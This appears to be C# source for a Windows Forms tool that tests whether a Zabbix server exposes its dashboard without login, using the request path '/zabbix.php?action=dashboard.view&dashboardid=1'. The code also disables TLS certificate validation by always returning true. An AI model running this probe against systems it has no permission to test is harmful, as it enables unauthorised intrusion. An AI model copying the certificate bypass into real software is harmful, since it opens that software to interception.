using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Net;
using System.Text;
using System.Windows.Forms;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;

namespace WindowsFormsApp2
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();

        }

        private static bool CheckValidationResult(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors errors)
        {
            return true; //总是接受  
        }
        public static string Post(string str, string url)
        {
            if (url.Contains("http") || url.Contains("HTTP") || url.Contains("https") || url.Contains("HTTPS"))
            {
                url = url + str;
            }
            else { url = @"http://" + url + str; }

            //else { url = @"https://" + url + str; }

            string result = "";

            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
            if (url.StartsWith("https", StringComparison.OrdinalIgnoreCase))
            {
                //Util.SetCertificatePolicy();
                //ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
                ////ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(CheckValidationResult);
                //req = WebRequest.Create(url) as HttpWebRequest;
                //req.ProtocolVersion = HttpVersion.Version11;
                req = WebRequest.Create(url) as HttpWebRequest;
                ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(CheckValidationResult);

                req.ProtocolVersion = HttpVersion.Version10;
                // 这里设置了协议类型。
                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;// SecurityProtocolType.Tls1.2; 
                req.KeepAlive = false;
                ServicePointManager.CheckCertificateRevocationList = true;
                ServicePointManager.DefaultConnectionLimit = 100;
                ServicePointManager.Expect100Continue = false;

            }
            req.Method = "GET";
            //req.ContentType = "application/x-www-form-urlencoded";
            //req.UserAgent = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8";

            //req.Headers.Add("Cache-Control", "max-age=0");
            //req.Headers.Add("accept-charset", str);

            //req.Headers.Add("Upgrade-Insecure-Requests", "1");

            //"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
            //req.Headers.Add("Connection", "close");
            //req.Headers.Add("Accept-Language", "zh-CN,zh;q=0.9");
            //req.Headers.Add("Accept-Encoding", "gzip,deflate");

            


            try
            {
                HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
                Stream stream = resp.GetResponseStream();
                
                //获取响应内容
                using (StreamReader reader = new StreamReader(stream, Encoding.UTF8))
                {
                    result = reader.ReadToEnd();

                }
                

            }
            catch
            {
                MessageBox.Show("通讯异常,请检查参数");
            }

            //响应结果

            return result;





        }

            private void label1_Click(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (textBox1.Text == "")
            {
                MessageBox.Show("URL网址不能为空");
                return;
            }
            string poc = @"/zabbix.php?action=dashboard.view&dashboardid=1";
            if (textBox2.Text != "")
            {
                poc = textBox2.Text + poc;
            }
            string res = Post(poc, textBox1.Text);
            if (res.Contains("Dashboard") && res.Contains("Problems") && res.Contains("Web monitoring"))
            {
                MessageBox.Show("存在漏洞");
            }
            else
            {
                MessageBox.Show("恭喜,不存在此漏洞");
            }
            //MessageBox.Show(res.ToString());
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }
    }
}
